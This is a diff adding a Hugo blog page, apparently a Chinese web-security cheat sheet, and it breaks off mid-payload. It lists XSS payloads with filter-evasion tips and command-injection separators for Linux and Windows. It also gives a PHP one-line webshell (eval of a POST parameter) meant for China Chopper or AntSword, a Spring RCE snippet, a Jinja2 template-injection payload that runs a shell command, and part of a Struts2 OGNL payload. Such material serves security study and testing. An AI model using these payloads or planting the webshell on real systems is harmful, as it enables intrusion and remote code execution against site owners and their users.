@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="XSS 1 2 3 4 &lt;script&gt;alert(666);&lt;/script&gt; &lt;a href=&#34;javascript:alert(666)&#34;&gt;touch me!&lt;/a&gt; &lt;img src=1 onerror=alert(666)&gt; &lt;input type=text onclick=alert(666) /&gt; 变体：改大小写，加引号，斜杠代替空格，使用回车与换行符，使用编码\n管道符 Linux常用管道符： ;前面的执行完执行后面的\r|显示后面的执行结果\r||当前面的执行出错时执行后面的\rWindows常用管道符 &amp;前面的语句为假则直接执行后面的\r&amp;&amp;前面的语句为假则直接出错，后面的也不执行\r|直接执行后面的语句\r||前面出错执行后面的\r危险函数与常量 PHP中常见代码执行函数： array_map()\reval()\rassert()\rpreg_replace()\rcall_user_func()\r$a($b)动态函数\rPHP中常见系统命令执行函数： system()\rexec()\rshell_exec()\rpassthru()\rpopen()\r反引号&quot;`&quot;\r危险常量 1 2 3 4 5 6 7 8 __LINE__ //文件中的当前行号 __FILE__ //文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名 __DIR__ //文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录 __FUNCTION__ //该常量所在的函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小写）。在PHP4中该值总是小写字母的 __CLASS__ //该类被定义时的名字（PHP 4.3.0 新加）。自PHP5起本常量返回该类被定义时的名字（区分大小写） __TRAIT__ //Trait的名字（PHP 5.4.0 新加）。自PHP5.4.0起，PHP实现了代码复用的一个方法，称为traits __METHOD__ //类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写） __NAMESPACE__ //当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增） 一句话系列 1 &lt;?php phpinfo();?&gt; 查看配置信息（注：php报错时会暴露绝对路径）\n">
+<title>速查表</title>
+
+<link rel='canonical' href='https://victorzhangai.github.io/%E9%80%9F%E6%9F%A5%E8%A1%A8/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="速查表">
+<meta property='og:description' content="XSS 1 2 3 4 &lt;script&gt;alert(666);&lt;/script&gt; &lt;a href=&#34;javascript:alert(666)&#34;&gt;touch me!&lt;/a&gt; &lt;img src=1 onerror=alert(666)&gt; &lt;input type=text onclick=alert(666) /&gt; 变体：改大小写，加引号，斜杠代替空格，使用回车与换行符，使用编码\n管道符 Linux常用管道符： ;前面的执行完执行后面的\r|显示后面的执行结果\r||当前面的执行出错时执行后面的\rWindows常用管道符 &amp;前面的语句为假则直接执行后面的\r&amp;&amp;前面的语句为假则直接出错，后面的也不执行\r|直接执行后面的语句\r||前面出错执行后面的\r危险函数与常量 PHP中常见代码执行函数： array_map()\reval()\rassert()\rpreg_replace()\rcall_user_func()\r$a($b)动态函数\rPHP中常见系统命令执行函数： system()\rexec()\rshell_exec()\rpassthru()\rpopen()\r反引号&quot;`&quot;\r危险常量 1 2 3 4 5 6 7 8 __LINE__ //文件中的当前行号 __FILE__ //文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名 __DIR__ //文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录 __FUNCTION__ //该常量所在的函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小写）。在PHP4中该值总是小写字母的 __CLASS__ //该类被定义时的名字（PHP 4.3.0 新加）。自PHP5起本常量返回该类被定义时的名字（区分大小写） __TRAIT__ //Trait的名字（PHP 5.4.0 新加）。自PHP5.4.0起，PHP实现了代码复用的一个方法，称为traits __METHOD__ //类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写） __NAMESPACE__ //当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增） 一句话系列 1 &lt;?php phpinfo();?&gt; 查看配置信息（注：php报错时会暴露绝对路径）\n">
+<meta property='og:url' content='https://victorzhangai.github.io/%E9%80%9F%E6%9F%A5%E8%A1%A8/'>
+<meta property='og:site_name' content='VZstless'>
+<meta property='og:type' content='article'><meta property='article:section' content='Page' /><meta property='article:published_time' content='2024-12-20T20:27:00&#43;08:00'/><meta property='article:modified_time' content='2024-12-20T20:27:00&#43;08:00'/>
+<meta name="twitter:title" content="速查表">
+<meta name="twitter:description" content="XSS 1 2 3 4 &lt;script&gt;alert(666);&lt;/script&gt; &lt;a href=&#34;javascript:alert(666)&#34;&gt;touch me!&lt;/a&gt; &lt;img src=1 onerror=alert(666)&gt; &lt;input type=text onclick=alert(666) /&gt; 变体：改大小写，加引号，斜杠代替空格，使用回车与换行符，使用编码\n管道符 Linux常用管道符： ;前面的执行完执行后面的\r|显示后面的执行结果\r||当前面的执行出错时执行后面的\rWindows常用管道符 &amp;前面的语句为假则直接执行后面的\r&amp;&amp;前面的语句为假则直接出错，后面的也不执行\r|直接执行后面的语句\r||前面出错执行后面的\r危险函数与常量 PHP中常见代码执行函数： array_map()\reval()\rassert()\rpreg_replace()\rcall_user_func()\r$a($b)动态函数\rPHP中常见系统命令执行函数： system()\rexec()\rshell_exec()\rpassthru()\rpopen()\r反引号&quot;`&quot;\r危险常量 1 2 3 4 5 6 7 8 __LINE__ //文件中的当前行号 __FILE__ //文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名 __DIR__ //文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录 __FUNCTION__ //该常量所在的函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小写）。在PHP4中该值总是小写字母的 __CLASS__ //该类被定义时的名字（PHP 4.3.0 新加）。自PHP5起本常量返回该类被定义时的名字（区分大小写） __TRAIT__ //Trait的名字（PHP 5.4.0 新加）。自PHP5.4.0起，PHP实现了代码复用的一个方法，称为traits __METHOD__ //类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写） __NAMESPACE__ //当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增） 一句话系列 1 &lt;?php phpinfo();?&gt; 查看配置信息（注：php报错时会暴露绝对路径）\n">
+    <link rel="shortcut icon" href="/1f365.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu9665492565906287031.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">VZstless</a></h1>
+            <h2 class="site-description">maybe a cat</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/VictorZhangAI'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://vzstless.notion.so'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/_index.zh-cn/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="5" cy="19" r="1" />
+  <path d="M4 4a16 16 0 0 1 16 16" />
+  <path d="M4 11a9 9 0 0 1 9 9" />
+</svg>
+
+
+
+                
+                <span>关于我</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li  class='current' >
+            <a href='/page/scsa-s/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>SCSA-S</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E8%BD%AC%E7%A7%BB%E4%B8%AD%E7%9A%84%E6%95%85%E4%BA%8B/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>转移中的故事</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#xss">XSS</a></li>
+        <li><a href="#管道符">管道符</a>
+          <ol>
+            <li><a href="#linux常用管道符">Linux常用管道符：</a></li>
+            <li><a href="#windows常用管道符">Windows常用管道符</a></li>
+          </ol>
+        </li>
+        <li><a href="#危险函数与常量">危险函数与常量</a>
+          <ol>
+            <li><a href="#php中常见代码执行函数">PHP中常见代码执行函数：</a></li>
+            <li><a href="#php中常见系统命令执行函数">PHP中常见系统命令执行函数：</a></li>
+            <li><a href="#危险常量">危险常量</a></li>
+          </ol>
+        </li>
+        <li><a href="#一句话系列">一句话系列</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/%E9%80%9F%E6%9F%A5%E8%A1%A8/">速查表</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2024-12-20</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    2 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="xss">XSS
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">666</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;javascript:alert(666)&#34;</span><span class="p">&gt;</span>touch me!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">1</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(666)</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">text</span> <span class="na">onclick</span><span class="o">=</span><span class="s">alert(666)</span> <span class="p">/&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>变体：改大小写，加引号，斜杠代替空格，使用回车与换行符，使用编码</p>
+<h3 id="管道符">管道符
+</h3><h4 id="linux常用管道符">Linux常用管道符：
+</h4><pre><code>;前面的执行完执行后面的
+|显示后面的执行结果
+||当前面的执行出错时执行后面的
+</code></pre>
+<h4 id="windows常用管道符">Windows常用管道符
+</h4><pre><code>&amp;前面的语句为假则直接执行后面的
+&amp;&amp;前面的语句为假则直接出错，后面的也不执行
+|直接执行后面的语句
+||前面出错执行后面的
+</code></pre>
+<h3 id="危险函数与常量">危险函数与常量
+</h3><h4 id="php中常见代码执行函数">PHP中常见代码执行函数：
+</h4><pre><code>array_map()
+eval()
+assert()
+preg_replace()
+call_user_func()
+$a($b)动态函数
+</code></pre>
+<h4 id="php中常见系统命令执行函数">PHP中常见系统命令执行函数：
+</h4><pre><code>system()
+exec()
+shell_exec()
+passthru()
+popen()
+反引号&quot;`&quot;
+</code></pre>
+<h4 id="危险常量">危险常量
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="no">__LINE__</span>       <span class="c1">//文件中的当前行号
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="no">__FILE__</span>       <span class="c1">//文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="no">__DIR__</span>        <span class="c1">//文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="no">__FUNCTION__</span>   <span class="c1">//该常量所在的函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小写）。在PHP4中该值总是小写字母的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="no">__CLASS__</span>      <span class="c1">//该类被定义时的名字（PHP 4.3.0 新加）。自PHP5起本常量返回该类被定义时的名字（区分大小写）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="no">__TRAIT__</span>      <span class="c1">//Trait的名字（PHP 5.4.0 新加）。自PHP5.4.0起，PHP实现了代码复用的一个方法，称为traits
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="no">__METHOD__</span>     <span class="c1">//类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="no">__NAMESPACE__</span>  <span class="c1">//当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增）
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="一句话系列">一句话系列
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看配置信息（注：php报错时会暴露绝对路径）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;123456&#34;</span><span class="p">])</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>一句话木马，后期可使用中国菜刀或中国蚁剑进行文件内容查看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">_</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">ProcessBuilder</span><span class="p">(</span><span class="s">&#34;touch&#34;</span><span class="p">,</span><span class="s">&#34;/tmp/success&#34;</span><span class="p">)).</span><span class="na">start</span><span class="p">()</span><span class="o">=</span><span class="n">sy</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Spring漏洞关键代码段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">values</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">b</span><span class="o">.</span><span class="vm">__class__</span> <span class="o">==</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="s1">&#39;eval&#39;</span> <span class="ow">in</span> <span class="n">b</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{{</span> <span class="n">b</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;id&#34;).read()&#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flask执行任意代码漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">%</span><span class="p">{(</span><span class="err">#</span><span class="n">dm</span><span class="o">=</span><span class="nd">@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class="p">).(</span><span class="err">#</span><span class="n">_memberAccess</span><span class="o">?</span><span class="p">(</span><span class="err">#</span><span class="n">_memberAccess</span><span class="o">=</span><span class="err">#</span><span class="n">dm</span><span class="p">):((</span><span class="err">#</span><span class="n">container</span><span class="o">=</span><span class="err">#</span><span class="n">context</span><span class="o">[</span><span class="err">&#39;</span><span class="n">com</span><span class="p">.</span><span class="na">opensymphony</span><span class="p">.</span><span class="na">xwork2</span><span class="p">.</span><span class="na">ActionContext</span><span class="p">.</span><span class="na">container</span><span class="err">&#39;</span><span class="o">]</span><span class="p">).(</span><span class="err">#</span><span class="n">ognlUtil</span><span class="o">=</span><span class="err">#</span><span class="n">container</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="nd">@com.opensymphony.xwork2.ognl.OgnlUtil@class</span><span class="p">)).(</span><span class="err">#</span><span class="n">ognlUtil</span><span class="p">.</span><span class="na">getExcludedPackageNames</span><span class="p">().</span><span class="na">clear</span><span class="p">()).(</span><span class="err">#</span><span class="n">ognlUtil</span><span class="p">.</span><span class="na">getExcludedClasses</span><span class="p">().</span><span class="na">clear</span><span class="p">()).(</span><span class="err">#</span><span class="n">context</span><span class="p">.</span><span class="na">setMemberAccess</span><span class="p">(</span><span class="err">#</span><span class="n">dm</span><span class="p">)))).(</span><span class="err">#</span><span class="n">cmd</span><span class="o">=</span><span class="err">&#39;</span><span class="n">id</span><span class="err">&#39;</span><span class="p">).(</span><span class="err">#</span><span class="n">iswin</span><span class="o">=</span><span class="p">(</span><span class="nd">@java.lang.System@getProperty</span><span 